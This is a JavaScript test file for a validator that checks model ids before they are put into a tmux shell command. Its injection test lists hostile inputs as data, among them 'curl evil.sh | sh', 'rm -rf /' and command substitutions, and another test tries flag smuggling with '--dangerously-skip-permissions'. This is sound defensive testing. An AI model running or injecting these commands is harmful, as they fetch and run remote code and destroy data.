import assert from "node:assert/strict";
import { test } from "node:test";
import { isValidModelId, modelFlag } from "./model-flag.js";

test("every model id we actually ship is accepted", () => {
  for (const id of [
    "claude-opus",
    "claude-haiku",
    "gpt-5-codex",
    "gpt-5",
    "anthropic/claude-sonnet",
    "openai/gpt-5",
    "local",
    "claude-opus-4-5-20251101",
  ]) {
    assert.equal(isValidModelId(id), true, `${id} should be valid`);
  }
});

test("shell metacharacters are rejected — the id lands in a /bin/sh command string", () => {
  // tmux runs its command through a shell, so an unvalidated id executes.
  for (const attack of [
    "haiku; curl evil.sh | sh",
    "haiku && rm -rf /",
    "haiku`whoami`",
    "haiku$(id)",
    "haiku | tee /tmp/pwned",
    "haiku\nrm -rf /",
    "haiku' ; echo pwned ; '",
  ]) {
    assert.equal(isValidModelId(attack), false, `${attack} must be rejected`);
    assert.throws(() => modelFlag(attack), /Invalid model id/);
  }
});

test("a leading dash cannot smuggle an extra flag", () => {
  assert.equal(isValidModelId("--dangerously-skip-permissions"), false);
  assert.equal(isValidModelId("-x"), false);
  // Nor can a leading slash point at a binary.
  assert.equal(isValidModelId("/bin/sh"), false);
});

test('absent or "default" means the CLI default, with no flag emitted', () => {
  assert.equal(modelFlag(undefined), "");
  assert.equal(modelFlag("   "), "");
  assert.equal(modelFlag("default"), "");
});

test("a valid id produces exactly the flag", () => {
  assert.equal(modelFlag("claude-opus"), " --model claude-opus");
  assert.equal(modelFlag("  claude-opus  "), " --model claude-opus");
});
